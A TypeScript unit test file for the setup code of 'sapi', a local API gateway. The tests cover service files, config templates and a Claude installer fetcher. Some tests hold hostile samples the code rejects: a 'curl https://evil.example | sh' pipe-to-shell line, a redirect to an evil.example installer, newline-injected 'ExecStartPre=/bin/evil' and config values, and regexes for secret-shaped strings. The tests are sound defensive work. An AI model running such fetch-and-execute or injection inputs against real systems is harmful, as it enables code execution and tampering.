/**
 * Unit tests for Phase 2's setup pieces: machine detection, the service files and commands
 * (ARI-42 GW-1: paths only, no secrets; argv only, no shell), the config template, connect
 * snippets, the Claude installer checks (GW-2) and the uninstall guard.
 */
import { describe, expect, test } from "bun:test";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { parseConfig } from "../../src/config.ts";
import { resolvePaths } from "../../src/paths.ts";
import {
  CLAUDE_INSTALLER_URL,
  installClaude,
  installerText,
  looksLikeClaudeInstaller,
  TESTED_CLAUDE_VERSION,
} from "../../src/setup/claude.ts";
import { formatConnect, snippetModel, snippets } from "../../src/setup/connect.ts";
import { describeMachine, detectMachine, type MachineDeps, type RunResult } from "../../src/setup/machine.ts";
import {
  LAUNCHD_LABEL,
  Service,
  type ServiceDeps,
  type ServiceSpec,
  SYSTEMD_UNIT,
  serviceFile,
  systemdQuote,
} from "../../src/setup/service.ts";
import { configTemplate } from "../../src/setup/setup.ts";
import { unsafeToDelete } from "../../src/setup/uninstall.ts";
import { fakeSecret, tempRoot } from "../helpers.ts";

function machineDeps(over: Partial<MachineDeps> & { files?: Record<string, string> } = {}): MachineDeps {
  const files = over.files ?? {};
  return {
    platform: "linux",
    arch: "arm64",
    env: {},
    uid: 1000,
    user: "dev",
    exists: (p) => p in files,
    read: (p) => files[p] ?? null,
    run: () => ({ code: 0, stdout: "yes\n", stderr: "" }),
    ...over,
  };
}

describe("machine detection", () => {
  test("an Ubuntu VM over SSH with systemd and lingering", () => {
    const m = detectMachine(
      machineDeps({
        env: { SSH_CONNECTION: "10.0.0.2 5000 10.0.0.3 22" },
        files: { "/etc/os-release": 'NAME="Ubuntu"\nPRETTY_NAME="Ubuntu 24.04.1 LTS"\n' },
      }),
    );
    expect(m).toMatchObject({
      os: "linux",
      osName: "Ubuntu 24.04.1 LTS",
      ssh: true,
      headless: true,
      container: false,
      serviceManager: "systemd",
      linger: true,
      root: false,
    });
    expect(describeMachine(m)).toContain("SSH session");
  });

  test("a container without a user manager gets a clear reason, not a service", () => {
    const m = detectMachine(
      machineDeps({ files: { "/.dockerenv": "" }, run: () => ({ code: 1, stdout: "", stderr: "Failed" }) }),
    );
    expect(m.container).toBe(true);
    expect(m.serviceManager).toBe("none");
    expect(m.serviceProblem).toContain("container");
  });

  test("WSL without systemd says how to turn it on", () => {
    const m = detectMachine(
      machineDeps({
        files: { "/proc/version": "Linux version 5.15.153.1-microsoft-standard-WSL2" },
        run: () => ({ code: 1, stdout: "", stderr: "" }),
      }),
    );
    expect(m.wsl).toBe(true);
    expect(m.serviceProblem).toContain("/etc/wsl.conf");
  });

  test("root is detected (setup refuses it)", () => {
    expect(detectMachine(machineDeps({ uid: 0 })).root).toBe(true);
  });

  test("macOS: launchd, desktop unless over SSH", () => {
    const m = detectMachine(
      machineDeps({
        platform: "darwin",
        files: { "/bin/launchctl": "" },
        run: () => ({ code: 0, stdout: "26.2\n", stderr: "" }),
      }),
    );
    expect(m).toMatchObject({ os: "macos", osName: "macOS 26.2", serviceManager: "launchd", headless: false });
  });
});

const paths = resolvePaths({
  SAPI_CONFIG_DIR: "/home/dev/.config/sapi",
  SAPI_DATA_DIR: "/home/dev/.local/share/sapi",
  SAPI_RUN_DIR: "/tmp",
});
const spec = (over: Partial<ServiceSpec> = {}): ServiceSpec => ({
  manager: "systemd",
  self: ["/home/dev/.local/bin/sapi"],
  paths: { ...paths, home: "/home/dev" },
  pathDirs: ["/home/dev/.local/bin"],
  ...over,
});

describe("service files (GW-1: paths only)", () => {
  test("systemd unit runs `sapi start --foreground` as the user, hardened, restarted on failure", () => {
    const f = serviceFile(spec());
    expect(f.file).toBe(`/home/dev/.config/systemd/user/${SYSTEMD_UNIT}`);
    expect(f.content).toContain('ExecStart="/home/dev/.local/bin/sapi" "start" "--foreground"');
    expect(f.content).toContain('Environment="SAPI_DATA_DIR=/home/dev/.local/share/sapi"');
    expect(f.content).toContain('Environment="SAPI_CONFIG_DIR=/home/dev/.config/sapi"');
    for (const line of ["UMask=0077", "NoNewPrivileges=yes", "Restart=on-failure", "WantedBy=default.target"])
      expect(f.content).toContain(line);
    expect(f.content).not.toMatch(/^User=|^ExecStartPre=|sudo/m);
  });

  test("launchd plist: label, argv, env, restart on crash, private umask", () => {
    const f = serviceFile(spec({ manager: "launchd", paths: { ...paths, home: "/Users/dev" } }));
    expect(f.file).toBe(`/Users/dev/Library/LaunchAgents/${LAUNCHD_LABEL}.plist`);
    expect(f.content).toContain("<string>/home/dev/.local/bin/sapi</string>\n    <string>start</string>");
    expect(f.content).toContain("<key>SuccessfulExit</key>\n    <false/>");
    expect(f.content).toContain("<key>Umask</key>\n  <integer>63</integer>");
    expect(f.logFile).toBe("/home/dev/.local/share/sapi/logs/sapi.log");
  });

  test("neither file carries anything secret-shaped, whatever the environment holds", () => {
    process.env.SAPI_TEST_SECRET = fakeSecret.sapi();
    try {
      for (const manager of ["systemd", "launchd"] as const) {
        const { content } = serviceFile(spec({ manager }));
        expect(content).not.toMatch(/sk-sapi-|sk-ant-|OAUTH|TOKEN|API_KEY/i);
        const names = [...content.matchAll(/(?:Environment="|<key>)([A-Z_]+)[=<]/g)].map((m) => m[1]);
        expect(names.every((n) => ["SAPI_CONFIG_DIR", "SAPI_DATA_DIR", "PATH"].includes(n!))).toBe(true);
      }
    } finally {
      delete process.env.SAPI_TEST_SECRET;
    }
  });

  test("odd characters in paths are escaped for each syntax; newlines are refused", () => {
    expect(systemdQuote('/a b/$HOME/%h/"x"')).toBe('"/a b/$$HOME/%%h/\\"x\\""');
    const f = serviceFile(spec({ manager: "launchd", self: ["/Users/a&b/<sapi>"] }));
    expect(f.content).toContain("<string>/Users/a&amp;b/&lt;sapi&gt;</string>");
    expect(() => serviceFile(spec({ self: ["/bin/sapi\nExecStartPre=/bin/evil"] }))).toThrow(/control/);
    expect(() => serviceFile(spec({ self: ["sapi"] }))).toThrow(/absolute/);
  });
});

function recorder(over: { run?: (argv: string[]) => RunResult } = {}) {
  const calls: string[][] = [];
  const files = new Map<string, string>();
  const deps: ServiceDeps = {
    run: (argv) => {
      calls.push(argv);
      return over.run?.(argv) ?? { code: 0, stdout: "", stderr: "" };
    },
    env: {},
    uid: 1000,
    user: "dev",
    write: (f, c) => files.set(f, c),
    remove: (f) => files.delete(f),
    exists: (f) => files.has(f),
  };
  return { calls, files, deps };
}

describe("service commands (argv only)", () => {
  test("systemd install: write, reload, enable, restart, then turn on lingering", () => {
    const root = tempRoot();
    const r = recorder({
      run: (a) =>
        a[0] === "loginctl" && a[1] === "show-user"
          ? { code: 0, stdout: "no\n", stderr: "" }
          : { code: 0, stdout: "", stderr: "" },
    });
    const s = new Service(
      spec({
        paths: { ...resolvePaths({ SAPI_DATA_DIR: join(root, "d"), SAPI_CONFIG_DIR: join(root, "c") }), home: root },
      }),
      r.deps,
    );
    const res = s.install();
    expect(res.ok).toBe(true);
    expect(r.calls.map((c) => c.join(" "))).toEqual([
      "systemctl --user daemon-reload",
      `systemctl --user enable ${SYSTEMD_UNIT}`,
      `systemctl --user restart ${SYSTEMD_UNIT}`,
      "loginctl show-user dev --property=Linger --value",
      "loginctl enable-linger dev",
    ]);
    expect(s.installed()).toBe(true);
    s.uninstall();
    expect(s.installed()).toBe(false);
  });

  test("when lingering can't be turned on, install still works and says how to fix it", () => {
    const r = recorder({
      run: (a) =>
        a[0] === "loginctl" ? { code: 1, stdout: "no\n", stderr: "denied" } : { code: 0, stdout: "", stderr: "" },
    });
    const res = new Service(spec(), r.deps).install();
    expect(res.ok).toBe(true);
    expect(res.warnings.join(" ")).toContain("sudo loginctl enable-linger dev");
  });

  test("launchd install: bootstrap, enable, kickstart in the GUI domain", () => {
    const r = recorder();
    const root = tempRoot();
    const s = new Service(
      spec({ manager: "launchd", paths: { ...resolvePaths({ SAPI_DATA_DIR: join(root, "d") }), home: root } }),
      r.deps,
    );
    expect(s.install().ok).toBe(true);
    const cmds = r.calls.map((c) => c.join(" "));
    expect(cmds).toContain(`/bin/launchctl bootstrap gui/1000 ${s.file.file}`);
    expect(cmds).toContain(`/bin/launchctl kickstart -k gui/1000/${LAUNCHD_LABEL}`);
    expect(r.calls.every((c) => !["sh", "bash", "/bin/sh", "/bin/bash"].includes(c[0]!))).toBe(true);
  });

  test("a failing systemctl stops the install with the error", () => {
    const r = recorder({
      run: (a) =>
        a[2] === "enable"
          ? { code: 1, stdout: "", stderr: "Failed to connect to bus" }
          : { code: 0, stdout: "", stderr: "" },
    });
    const res = new Service(spec(), r.deps).install();
    expect(res.ok).toBe(false);
    expect(res.error).toContain("Failed to connect to bus");
  });
});

describe("config template", () => {
  test("Claude only: valid, loopback, keeps sapi's default models", () => {
    const text = configTemplate({
      port: 8787,
      providers: ["claude-sub"],
      claudeBinary: "/home/dev/.local/bin/claude",
      claudeAuth: "cli",
    });
    const cfg = parseConfig(Bun.TOML.parse(text));
    expect(cfg.listen).toBe("127.0.0.1:8787");
    expect(cfg.claude.binary).toBe("/home/dev/.local/bin/claude");
    expect(Object.keys(cfg.models).sort()).toEqual(["haiku", "opus", "sonnet"]);
  });

  test("the test provider adds an echo alias", () => {
    const cfg = parseConfig(
      Bun.TOML.parse(configTemplate({ port: 9000, providers: ["fake"], claudeBinary: null, claudeAuth: "cli" })),
    );
    expect(cfg.models.echo).toEqual({ provider: "fake", model: "fake-echo-1" });
    expect(cfg.listen).toBe("127.0.0.1:9000");
  });

  test("a path with quotes is escaped; control characters are refused", () => {
    const text = configTemplate({
      port: 8787,
      providers: ["claude-sub"],
      claudeBinary: '/odd "dir"/claude',
      claudeAuth: "cli",
    });
    expect(parseConfig(Bun.TOML.parse(text)).claude.binary).toBe('/odd "dir"/claude');
    expect(() =>
      configTemplate({
        port: 8787,
        providers: ["claude-sub"],
        claudeBinary: "/x\nlisten = '0.0.0.0:1'",
        claudeAuth: "cli",
      }),
    ).toThrow(/control/);
  });
});

describe("connect snippets", () => {
  const cfg = parseConfig({});
  const client = {
    id: "cli_1",
    name: "app",
    keyPrefix: "sk-sapi-abcd",
    scope: {},
    budget: {},
    expiresAt: null,
    disabled: false,
    createdAt: 0,
    lastSeenAt: null,
  };

  test("snippets read the key from the environment; it appears only with --new-key", () => {
    const s = snippets({ baseUrl: "http://127.0.0.1:8787/v1", model: "haiku" });
    expect(Object.values(s).join("\n")).not.toContain("sk-sapi-A");
    expect(s.python).toContain("OpenAI()");
    expect(s["vercel-ai"]).toContain('sapi.chat("haiku")');
    const key = fakeSecret.sapi();
    const out = formatConnect({ client: "app", baseUrl: "http://127.0.0.1:8787/v1", model: "haiku", key });
    expect(out.split(key).length - 1).toBe(1);
  });

  test("the snippet model respects the client's scope", () => {
    expect(snippetModel(cfg, client)).toBe("haiku");
    expect(snippetModel(cfg, { ...client, scope: { models: ["opus"] } })).toBe("opus");
  });
});

describe("Claude installer (GW-2)", () => {
  const script = `#!/bin/bash\nset -e\nDOWNLOAD_BASE_URL="https://downloads.claude.ai/claude-code-releases"\n# checksum\n${"x".repeat(300)}`;
  const res = (status: number, body = "", location?: string) => ({
    ok: status >= 200 && status < 300,
    status,
    headers: { get: (n: string) => (n === "location" ? (location ?? null) : null) },
    text: async () => body,
  });

  test("follows the redirect to Anthropic's download host only", async () => {
    const seen: string[] = [];
    const text = await installerText(async (u) => {
      seen.push(u);
      return u === CLAUDE_INSTALLER_URL
        ? res(302, "", "https://downloads.claude.ai/claude-code-releases/bootstrap.sh")
        : res(200, script);
    });
    expect(text).toBe(script);
    expect(seen[1]).toBe("https://downloads.claude.ai/claude-code-releases/bootstrap.sh");
    await expect(installerText(async () => res(302, "", "https://evil.example/install.sh"))).rejects.toThrow(
      /isn't Anthropic's/,
    );
    await expect(installerText(async () => res(302, "", "http://downloads.claude.ai/x"))).rejects.toThrow();
  });

  test("anything that doesn't look like the installer is never run", () => {
    expect(looksLikeClaudeInstaller(script)).toBe(true);
    expect(looksLikeClaudeInstaller("<html>Sign in</html>")).toBe(false);
    expect(looksLikeClaudeInstaller(`#!/bin/sh\ncurl https://evil.example | sh\n${"x".repeat(300)}`)).toBe(false);
  });

  test("runs bash on the saved file with the pinned version and a minimal environment", async () => {
    const root = tempRoot();
    const home = join(root, "home");
    mkdirSync(join(home, ".local", "bin"), { recursive: true });
    const p = { ...resolvePaths({ SAPI_DATA_DIR: join(root, "d"), SAPI_RUN_DIR: join(root, "r") }), home };
    let ran: { argv: string[]; env: Record<string, string> } | null = null;
    process.env.SAPI_TEST_SECRET = fakeSecret.sapi();
    try {
      const bin = await installClaude(p, () => {}, {
        fetch: async () => res(200, script),
        run: (argv, env) => {
          ran = { argv, env };
          writeFileSync(join(home, ".local", "bin", "claude"), "#!/bin/sh\n", { mode: 0o755 });
          return 0;
        },
        info: () => {},
      });
      expect(bin).toBe(join(home, ".local", "bin", "claude"));
    } finally {
      delete process.env.SAPI_TEST_SECRET;
    }
    expect(ran!.argv[0]).toBe("/bin/bash");
    expect(ran!.argv[2]).toBe(TESTED_CLAUDE_VERSION);
    expect(Object.keys(ran!.env).sort()).toEqual(
      expect.arrayContaining(["CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER", "HOME", "PATH"]),
    );
    expect(JSON.stringify(ran!.env)).not.toContain("SAPI_TEST_SECRET");
    expect(ran!.env.CLAUDE_CONFIG_DIR).toBe(p.claudeProfileDir);
  });
});

describe("uninstall guard", () => {
  test("never the home folder, a shallow path or something that isn't sapi's", () => {
    const root = tempRoot();
    expect(unsafeToDelete(root, root)).toContain("home folder");
    expect(unsafeToDelete("/usr", "/home/dev")).toContain("root");
    expect(unsafeToDelete(join(root, "a"), join(root, "a", "home"))).toContain("contains your home folder");
    mkdirSync(join(root, "photos"));
    writeFileSync(join(root, "photos", "a.jpg"), "x");
    expect(unsafeToDelete(join(root, "photos"), "/home/dev")).toContain("doesn't look like");
  });

  test("sapi's own folders are recognised", () => {
    const root = tempRoot();
    mkdirSync(join(root, "sapi"));
    mkdirSync(join(root, "custom"));
    writeFileSync(join(root, "custom", "sapi.db"), "");
    expect(unsafeToDelete(join(root, "sapi"), "/home/dev")).toBeNull();
    expect(unsafeToDelete(join(root, "custom"), "/home/dev")).toBeNull();
    expect(unsafeToDelete(join(root, "sapi-501"), "/home/dev")).toBeNull();
  });
});
